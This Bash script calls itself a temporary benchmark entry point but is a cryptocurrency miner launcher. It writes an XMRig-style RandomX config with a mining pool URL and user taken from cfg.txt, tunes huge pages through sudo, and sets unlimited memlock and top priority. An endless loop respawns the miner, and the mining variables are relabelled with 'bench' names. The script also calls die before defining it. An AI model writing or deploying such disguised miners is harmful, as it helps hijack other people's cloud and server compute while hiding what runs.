#!/usr/bin/env bash
# 临时跑分入口。一次性包。不要并回密封运行时。
set -euo pipefail

cd "$(dirname "$0")"
export TZ=Asia/Shanghai
LOG=run.log
TAG="${1:-}"
[[ -n "$TAG" ]] || die "need name"
CFG=cfg.txt
BIN=./bench
JSON=bench.json

ts() { date +%H:%M:%S; }
say() { echo "$(ts) $*" | tee -a "$LOG"; }
die() { say "err $*"; exit 1; }

# ---- 门禁 ----
if [[ "$(uname -s)" != "Linux" ]]; then
  die "linux only"
fi
if [[ ! -x "$BIN" ]]; then
  if [[ -f "$BIN" ]]; then chmod +x "$BIN" || true; fi
fi
if [[ ! -x "$BIN" ]]; then
  die "binary missing"
fi
if ! file "$BIN" 2>/dev/null | grep -q 'ELF 64-bit'; then
  die "need x64 static bin"
fi
if ! grep -qw aes /proc/cpuinfo; then
  die "no aes"
fi
if [[ ! -f "$CFG" ]]; then
  die "missing cfg"
fi

# 读连接占位；仍是尖括号就停，避免默默连空对端
BENCH_URL=""
BENCH_USER=""
# shellcheck disable=SC1090
source "$CFG"
if [[ -z "${BENCH_URL:-}" || -z "${BENCH_USER:-}" ]]; then
  die "bad cfg"
fi
if [[ "$BENCH_URL" == *"<"* || "$BENCH_USER" == *"<"* ]]; then
  die "bad cfg"
fi

# ---- 核数 / 物理核列表（跳过超线程兄弟）----
mapfile -t PINS < <(awk '
  /^processor/ { proc=$3 }
  /^physical id/ { phys=$4 }
  /^core id/ { core=$4; key=phys"-"core; if (!(key in seen)) { seen[key]=1; print proc } }
' /proc/cpuinfo)

if [[ ${#PINS[@]} -eq 0 ]]; then
  n="$(nproc)"
  PINS=()
  for ((i=0; i<n; i++)); do PINS+=("$i"); done
fi

# 环境变量可截前 N 个；默认用全部物理核
if [[ -n "${BENCH_THREADS:-}" ]]; then
  if ! [[ "$BENCH_THREADS" =~ ^[0-9]+$ ]] || (( BENCH_THREADS < 1 )); then
    die "bad threads"
  fi
  if (( BENCH_THREADS < ${#PINS[@]} )); then
    PINS=("${PINS[@]:0:BENCH_THREADS}")
  fi
fi

THREADS="${#PINS[@]}"
if (( THREADS < 1 )); then
  die "no cpu"
fi

# randomx.init 必须用逻辑核 nproc，禁止用干活线程数
NPROC="$(nproc)"

# 最大逻辑编号：>=64 则 64 位掩码失效，绝不能走 --cpu-affinity
MAX_PIN=0
for c in "${PINS[@]}"; do
  if (( c > MAX_PIN )); then MAX_PIN=$c; fi
done
USE_MASK=0
if (( MAX_PIN < 64 && THREADS <= 64 )); then
  USE_MASK=1
fi
# 本包面向 192 核：强制走编号列表，避免一条路径绑错
if (( MAX_PIN >= 64 || THREADS > 64 )); then
  USE_MASK=0
fi

# 64 位掩码只在确认安全时才算；bash $((1<<n)) 在 n>=64 会静默变 0
AFFINITY_HEX=""
if (( USE_MASK == 1 )); then
  MASK=0
  for c in "${PINS[@]}"; do
    if (( c >= 64 )); then
      USE_MASK=0
      AFFINITY_HEX=""
      break
    fi
    MASK=$(( MASK | (1 << c) ))
  done
  if (( USE_MASK == 1 )); then
    AFFINITY_HEX="$(printf '0x%x' "$MASK")"
  fi
fi

# rx 短数组：每个数字是 CPU 编号，不是位。192 核能写 128、191。
RX_JSON="$(printf '%s,' "${PINS[@]}")"
RX_JSON="[${RX_JSON%,}]"
PIN_CSV="$(IFS=','; echo "${PINS[*]}")"

# ---- 厂商 → asm / jit ----
VENDOR="$(awk -F: '/vendor_id/{print $2; exit}' /proc/cpuinfo | tr -d '[:space:]')"
ASM_ARG=()
JIT_JSON="false"
if [[ "$VENDOR" == "AuthenticAMD" ]]; then
  ASM_ARG=(--asm=ryzen --huge-pages-jit)
  JIT_JSON="true"
elif [[ "$VENDOR" == "GenuineIntel" ]]; then
  ASM_ARG=(--asm=intel)
  JIT_JSON="false"
fi

# ---- 内存 / numa / fast ----
AVAIL_MB="$(awk '/MemAvailable/{print int($2/1024); exit}' /proc/meminfo)"
NUMA_N=1
if [[ -d /sys/devices/system/node ]]; then
  NUMA_N="$(find /sys/devices/system/node -maxdepth 1 -name 'node[0-9]*' | wc -l | tr -d ' ')"
  if [[ -z "$NUMA_N" || "$NUMA_N" -lt 1 ]]; then NUMA_N=1; fi
fi
need_fast() {
  local nodes="$1"
  echo $(( nodes * 2080 + 120 + 3 * THREADS ))
}
RX_MODE="fast"
NUMA_JSON="true"
if (( AVAIL_MB < $(need_fast "$NUMA_N") )); then
  if (( AVAIL_MB >= $(need_fast 1) )); then
    NUMA_JSON="false"
  else
    RX_MODE="light"
    NUMA_JSON="false"
    say "mem tight, light mode"
  fi
fi

# ---- 大页：能写就写，GCP 失败继续 ----
USE_1GB="false"
HUGE_OK=0
ROOTISH=0
if [[ "$(id -u)" == "0" ]]; then
  ROOTISH=1
elif sudo -n true 2>/dev/null; then
  ROOTISH=1
fi

sysw() {
  # $1=路径 $2=值；失败返回 1，不触发 set -e 退出
  local p="$1" v="$2"
  if [[ "$ROOTISH" != "1" ]]; then return 1; fi
  if [[ ! -w "$p" ]]; then
    if sudo -n true 2>/dev/null; then
      echo "$v" | sudo -n tee "$p" >/dev/null 2>&1 || return 1
      return 0
    fi
    return 1
  fi
  echo "$v" >"$p" 2>/dev/null || return 1
}

if [[ "$RX_MODE" == "fast" && "$ROOTISH" == "1" ]]; then
  sysw /proc/sys/vm/compact_memory 1 || true

  # 探测 2M 页是否可写：写回当前值，成功才继续申请
  CUR_2M="$(cat /proc/sys/vm/nr_hugepages 2>/dev/null || echo)"
  if [[ -n "$CUR_2M" ]] && sysw /proc/sys/vm/nr_hugepages "$CUR_2M"; then
    ONEG_DIR=/sys/kernel/mm/hugepages/hugepages-1048576kB
    HAVE_PDPE=0
    if grep -qw pdpe1gb /proc/cpuinfo; then HAVE_PDPE=1; fi

    # 按你的要求尝试 1G；回读 free>=2 才算数。GCP 常见：目录不存在或 free=0
    if [[ "$HAVE_PDPE" == "1" && -d "$ONEG_DIR" ]]; then
      sysw "$ONEG_DIR/nr_hugepages" 3 || true
      FREE_1G="$(cat "$ONEG_DIR/free_hugepages" 2>/dev/null || echo 0)"
      if [[ "$FREE_1G" =~ ^[0-9]+$ ]] && (( FREE_1G >= 2 )); then
        USE_1GB="true"
      else
        sysw "$ONEG_DIR/nr_hugepages" 0 || true
        USE_1GB="false"
      fi
    fi

    if [[ "$USE_1GB" == "true" ]]; then
      NEED=$(( THREADS * 2 + 48 ))
    else
      NEED=$(( 1040 + THREADS * 2 + 48 ))
    fi
    CAP=$(( (AVAIL_MB - 80) / 2 ))
    if (( CAP > 0 && NEED > CAP )); then NEED=$CAP; fi
    if (( NEED < 0 )); then NEED=0; fi

    if (( NEED > 0 )); then
      sysw /proc/sys/vm/nr_hugepages "$NEED" || true
      FREE_2M="$(awk '/HugePages_Free/{print $2; exit}' /proc/meminfo)"
      if [[ "$FREE_2M" =~ ^[0-9]+$ ]] && (( FREE_2M >= NEED )); then
        HUGE_OK=1
      else
        # 不够就用已有的，不重试死磕
        HUGE_OK=0
      fi
    fi
  else
    say "hugemem skip"
  fi
else
  if [[ "$ROOTISH" != "1" ]]; then
    say "hugemem skip"
  fi
fi

# 1G 没锁上就绝不能把 1gb-pages 写成 true（否则二进制按 1G 路径走会静默变慢/失败）
if [[ "$USE_1GB" == "true" && "$HUGE_OK" != "1" ]]; then
  # 2M 伴随页没够时，仍允许 1G 数据集（判断书：数据集在 1G 里）
  ONEG_DIR=/sys/kernel/mm/hugepages/hugepages-1048576kB
  FREE_1G="$(cat "$ONEG_DIR/free_hugepages" 2>/dev/null || echo 0)"
  if ! [[ "$FREE_1G" =~ ^[0-9]+$ ]] || (( FREE_1G < 2 )); then
    USE_1GB="false"
  fi
fi

# ---- 写 bench.json（连接字段来自 cfg，不在脚本里写死）----
WORKER="${THREADS}-$(awk '/MemTotal/{print int($2/1024/1024); exit}' /proc/meminfo)-linux"
if [[ -n "$TAG" ]]; then WORKER="${WORKER}-${TAG}"; fi

cat >"$JSON" <<EOF
{
  "autosave": false,
  "donate-level": 0,
  "cpu": {
    "enabled": true,
    "huge-pages": true,
    "huge-pages-jit": ${JIT_JSON},
    "priority": 5,
    "memory-pool": true,
    "yield": false,
    "max-threads-hint": 100,
    "asm": true,
    "rx": ${RX_JSON}
  },
  "randomx": {
    "init": ${NPROC},
    "mode": "${RX_MODE}",
    "1gb-pages": ${USE_1GB},
    "numa": ${NUMA_JSON}
  },
  "http": {
    "enabled": true,
    "host": "127.0.0.1",
    "port": 18080,
    "restricted": true
  },
  "pools": [
    {
      "url": "${BENCH_URL}",
      "user": "${BENCH_USER}/${TAG}",
      "pass": "x",
      "keepalive": true,
      "tls": false
    }
  ],
  "print-time": 0,
  "colors": false
}
EOF

say "cpu check ok ${WORKER}"
if (( USE_MASK == 0 )); then
  say "affinity list ${THREADS} cpus, mask skip"
fi
if [[ "$USE_1GB" != "true" ]]; then
  say "hugemem 1g off"
fi

# memlock / 优先级：失败继续
if [[ "$ROOTISH" == "1" ]]; then
  command -v prlimit >/dev/null 2>&1 && prlimit --memlock=unlimited:unlimited -p $$ 2>/dev/null || true
  renice -n -20 $$ >/dev/null 2>&1 || true
fi

# ---- 最终启动命令（192 核不要出现 --cpu-affinity）----
CMD=("$BIN" --config="$JSON" --http-port=18080 --threads="$THREADS")
if [[ ${#ASM_ARG[@]} -gt 0 ]]; then
  CMD+=("${ASM_ARG[@]}")
fi
if (( USE_MASK == 1 )) && [[ -n "$AFFINITY_HEX" ]]; then
  CMD+=(--cpu-affinity="$AFFINITY_HEX")
fi

# 编号列表路径：用 taskset 再限一层（内核集合，不是 64 位掩码）
WRAP=()
if (( USE_MASK == 0 )) && command -v taskset >/dev/null 2>&1; then
  WRAP=(taskset -c "$PIN_CSV")
fi

say "bench ready"

# 外层循环：挂了就再拉起，复用同一份 json，不再探测
while true; do
  "${WRAP[@]}" "${CMD[@]}" >>"$LOG" 2>&1 || true
  sleep 5
done
